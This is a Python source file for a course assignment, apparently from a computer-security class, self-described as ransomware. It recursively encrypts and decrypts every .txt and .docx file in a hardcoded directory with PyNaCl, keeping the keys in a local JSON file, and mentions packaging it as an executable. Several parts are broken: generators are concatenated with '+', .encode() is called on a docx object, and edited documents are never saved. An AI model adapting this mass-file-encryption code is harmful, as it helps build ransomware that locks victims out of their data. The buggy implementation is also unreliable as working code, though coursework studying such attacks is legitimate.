# Ransomware program for encrypting entire file directory, CS 683

import nacl.utils
from nacl.public import PrivateKey, Box, PublicKey
import json
from pathlib import Path
from docx import Document
from docx.shared import Inches

'''
Created new ransomware code to include .docx files in addition to .txt files. Also modified system to only use 1 pair of public/private keys rather than 2. 
Also experimenting with the use of UNIX executable files using PyInstaller. 
'''


class Pynacl:
    def __init__(self):
        pass

    def generate_keys(self):
        # Generate first users public and private keys
        # Public key is generated using Curve25519 high-speed elliptic curve cryptography
        private_key1 = PrivateKey.generate()
        public_key1 = private_key1.public_key
        p1 = str(private_key1)
        p2 = str(public_key1)

        # Generate second users public and private keys, after this public keys between users should be exchanged
        private_key2 = PrivateKey.generate()
        public_key2 = private_key2.public_key
        p3 = str(private_key2)
        p4 = str(public_key2)

        with open('config2.json') as json_file:
            data = json.load(json_file)
            data['private_key1'] = p1
            data['public_key1'] = p2
            data['private_key2'] = p3
            data['public_key2'] = p4
        json_file.close()
        print("New public and private keys generated:")
        print(p1)
        print(p2)
        print(p3)
        print(p4)
        print()

        with open("config2.json", "w") as json_file2:
            json.dump(data, json_file2, indent=4, sort_keys=True)
        json_file2.close()

    def encrypt(self, file):
        with open('config2.json') as json_file:
            data = json.load(json_file)
            pub_key1 = data['public_key1']
            priv_key1 = data['private_key1']
        json_file.close()

        # Convert public key and private key to byte strings, then actual PublicKey and PrivateKey objects
        priv_keyb1 = self.str_to_bytestring(priv_key1)
        pub_keyb1 = self.str_to_bytestring(pub_key1)
        private_key1 = PrivateKey(priv_keyb1)
        public_key1 = PublicKey(pub_keyb1)

        # Read in contents of file, encrypt them, then write back
        if '.txt' in file:
            with open(file) as f:
                content = f.read()
            f.close()
        elif '.docx' in file:
            f = open(file, 'rb')
            content = Document(f)
            f.close()
        bytesData = content.encode()

        user_box1 = Box(private_key1, public_key1)
        nonce = nacl.utils.random(Box.NONCE_SIZE)
        encrypted = user_box1.encrypt(bytesData, nonce)

        if '.txt' in file:
            with open(file, "w") as text_file:
                text_file.write(str(encrypted))
            text_file.close()
        elif '.docx' in file:
            f = open(file, 'rb')
            document = Document(f)
            document.add_paragraph(encrypted)
            f.close()

    def decrypt(self, file):
        # read encrypted data from file
        if '.txt' in file:
            with open(file) as f:
                content = f.read()
            f.close()
        elif '.docx' in file:
            f = open(file, 'rb')
            content = Document(f)
            f.close()

        # read 1st public key and 2nd private key from config2.json
        with open('config2.json') as json_file:
            data = json.load(json_file)
            pub_key1 = data['public_key1']
            priv_key1 = data['private_key1']
        json_file.close()

        # Convert public key, private key, and encrypted data to byte strings
        priv_keyb1 = self.str_to_bytestring(priv_key1)
        pub_keyb1 = self.str_to_bytestring(pub_key1)
        content2 = self.str_to_bytestring(content)

        # decrypt encrypted data and write back to file
        private_key1 = PrivateKey(priv_keyb1)
        public_key1 = PublicKey(pub_keyb1)
        user_box2 = Box(private_key1, public_key1)
        decrypted = user_box2.decrypt(content2).decode("utf-8")

        if '.txt' in file:
            with open(file, "w") as text_file:
                text_file.write(decrypted)
            text_file.close()
        elif '.docx' in file:
            f = open(file, 'rb')
            document = Document(f)
            document.add_paragraph(decrypted)
            f.close()

    '''
    This function takes a string representing a byte array (usually a key or encrypted data read from a file) and turns it into an actual byte string.
    '''
    def str_to_bytestring(self, string):
        string = string[2:]
        string = string[:-1]

        bytes = string.encode()
        bytes2 = bytes.decode('unicode-escape').encode('ISO-8859-1')

        return bytes2

    def iterate_encrypt(self, directory):
        pathlist = Path(directory).glob('**/*.txt')
        pathlist2 = Path(directory).glob('**/*.docx')
        final_path = pathlist + pathlist2
        for path in final_path:
            # because path is object not string
            path_in_str = str(path)
            print(path_in_str)
            self.encrypt(path_in_str)
        print("All files successfully encrypted. \n")

    def iterate_decrypt(self, directory):
        pathlist = Path(directory).glob('**/*.txt')
        pathlist2 = Path(directory).glob('**/*.docx')
        final_path = pathlist + pathlist2
        for path in final_path:
            # because path is object not string
            path_in_str = str(path)
            print(path_in_str)
            self.decrypt(path_in_str)
        print("All files successfully decrypted. \n")


def main():
    pynacl = Pynacl()
    directory = "/Users/omarsharif/IdeaProjects/USF/CS 683 (Computer Security)/PyNaCl_program" # enter this project directory here
    flag = True

    while (flag):
        response = input('Enter 1 to generate new public and private keys, 2 to encrypt all text files in current directory, 3 to decrypt all text '
                         'files in directory, and 4 to exit program: ')

        if response == "1":
            pynacl.generate_keys()

        elif response == "2":
            pynacl.iterate_encrypt(directory)

        elif response == "3":
            pynacl.iterate_decrypt(directory)

        elif response == "4":
            flag = False
            print('\nExiting Program!!!\n')
            break


if __name__ == "__main__":
    main()

